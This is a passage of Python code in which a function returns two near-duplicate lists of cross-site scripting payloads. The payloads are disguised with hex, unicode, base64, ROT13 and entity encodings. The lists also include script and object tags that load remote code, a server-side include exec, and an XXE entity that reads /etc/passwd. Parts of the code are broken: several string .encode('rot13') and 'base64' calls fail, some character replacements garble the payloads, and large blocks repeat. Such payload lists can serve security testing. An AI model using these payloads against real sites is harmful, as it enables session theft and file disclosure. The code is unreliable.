        '\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x78\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x65\x76\x61\x6C\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x39\x37\x2C\x31\x30\x30\x2C\x31\x31\x30\x2C\x31\x32\x31\x2C\x31\x31\x35\x2C\x31\x31\x34\x2C\x34\x30\x2C\x34\x30\x2C\x49\x54\x45\x29\x29\x3E',
        '\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x22\x3E\x43\x6C\x69\x63\x6B\x20\x4D\x65\x3C\x2F\x61\x3E',
        # Unicode escape sequences
        '\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E',
        '\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0039\u0037\u002C\u0031\u0030\u0030\u002C\u0031\u0031\u0030\u002C\u0031\u0032\u0031\u002C\u0031\u0031\u0035\u002C\u0031\u0031\u0034\u002C\u0034\u0030\u002C\u0034\u0030\u002C\u0049\u0054\u0045\u0029\u0029\u003E',
        '\u003C\u0061\u0020\u0068\u0072\u0065\u0066\u003D\u0022\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003E\u0043\u006C\u0069\u0063\u006B\u0020\u004D\u0065\u003C\u002F\u0061\u003E',
        # Base64 encoding
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'PGltZyBzcmM9eCBvbmVycm9yPWV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSg5NywxMDAsMTEwLDExMSwxMTUsMTE0LDQwLDQwLElURSkpPg==',
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+',
        # UTF-16 encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e',
        '\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0039\u0037\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0030\u002c\u0031\u0032\u0031\u002c\u0031\u0031\u0035\u002c\u0031\u0031\u0034\u002c\u0034\u0030\u002c\u0034\u0030\u002c\u0049\u0054\u0045\u0029\u0029\u003e',
        '\u003c\u0061\u0020\u0068\u0072\u0065\u0066\u003d\u0022\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003e\u0043\u006c\u0069\u0063\u006b\u0020\u004d\u0065\u003c\u002f\u0061\u003e',
        # ROT13 encoding
        '<script>alert("XSS")</script>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<a href="javascript:alert(\'XSS\')">Click Me</a>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        # Percent-encoded characters
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E',
        '%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E',
        # HTML entity references
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;',
        '&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click Me&lt;/a&gt;',
        # Combination of techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-16le').decode('utf-16le'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('rot13'),
        # Uppercase
        '<SCRIPT>ALERT("XSS")</SCRIPT>',
        # Lowercase
        '<script>alert("xss")</script>',
        # Swap case
        '<SCRIPT>ALERT("xss")</SCRIPT>'.swapcase(),
        # Reverse payload
        '<script>alert("XSS")</script>'[::-1],
        # More obfuscation techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'.replace('a', '\x00a').replace('l', '\x00c'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '\u003Cscript\u003Ealert(\u0022XSS\u0022)\u003C/script\u003E'.replace('a', '\x00a').replace('l', '\x00c'),
        # UTF-32LE encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-32le').decode('utf-32le'),
        # More parameter pollution
        '<script src="http://example.com/xss.js?param1=value1&param2=value2&param3=value3"></script>',
        # More obfuscation combinations
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('utf-32').decode('utf-32'),
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+'.encode('rot13').decode('rot13'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.encode('base64').decode('base64'),
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    else:
        return [        # Hexadecimal escape sequences
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E',
        '\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x78\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x65\x76\x61\x6C\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x39\x37\x2C\x31\x30\x30\x2C\x31\x31\x30\x2C\x31\x32\x31\x2C\x31\x31\x35\x2C\x31\x31\x34\x2C\x34\x30\x2C\x34\x30\x2C\x49\x54\x45\x29\x29\x3E',
        '\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x22\x3E\x43\x6C\x69\x63\x6B\x20\x4D\x65\x3C\x2F\x61\x3E',
        # Unicode escape sequences
        '\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E',
        '\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0039\u0037\u002C\u0031\u0030\u0030\u002C\u0031\u0031\u0030\u002C\u0031\u0032\u0031\u002C\u0031\u0031\u0035\u002C\u0031\u0031\u0034\u002C\u0034\u0030\u002C\u0034\u0030\u002C\u0049\u0054\u0045\u0029\u0029\u003E',
        '\u003C\u0061\u0020\u0068\u0072\u0065\u0066\u003D\u0022\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003E\u0043\u006C\u0069\u0063\u006B\u0020\u004D\u0065\u003C\u002F\u0061\u003E',
        # Base64 encoding
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'PGltZyBzcmM9eCBvbmVycm9yPWV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSg5NywxMDAsMTEwLDExMSwxMTUsMTE0LDQwLDQwLElURSkpPg==',
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+',
        # UTF-16 encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e',
        '\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0039\u0037\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0030\u002c\u0031\u0032\u0031\u002c\u0031\u0031\u0035\u002c\u0031\u0031\u0034\u002c\u0034\u0030\u002c\u0034\u0030\u002c\u0049\u0054\u0045\u0029\u0029\u003e',
        '\u003c\u0061\u0020\u0068\u0072\u0065\u0066\u003d\u0022\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003e\u0043\u006c\u0069\u0063\u006b\u0020\u004d\u0065\u003c\u002f\u0061\u003e',
        # ROT13 encoding
        '<script>alert("XSS")</script>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<a href="javascript:alert(\'XSS\')">Click Me</a>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        # Percent-encoded characters
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E',
        '%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E',
        # HTML entity references
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;',
        '&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click Me&lt;/a&gt;',
        # Combination of techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-16le').decode('utf-16le'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('rot13'),
        # Uppercase
        '<SCRIPT>ALERT("XSS")</SCRIPT>',
        # Lowercase
        '<script>alert("xss")</script>',
        # Swap case
        '<SCRIPT>ALERT("xss")</SCRIPT>'.swapcase(),
        # Reverse payload
        '<script>alert("XSS")</script>'[::-1],
        # More obfuscation techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'.replace('a', '\x00a').replace('l', '\x00c'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '\u003Cscript\u003Ealert(\u0022XSS\u0022)\u003C/script\u003E'.replace('a', '\x00a').replace('l', '\x00c'),
        # UTF-32LE encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-32le').decode('utf-32le'),
        # More parameter pollution
        '<script src="http://example.com/xss.js?param1=value1&param2=value2&param3=value3"></script>',
        # More obfuscation combinations
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('utf-32').decode('utf-32'),
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+'.encode('rot13').decode('rot13'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.encode('base64').decode('base64'),
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
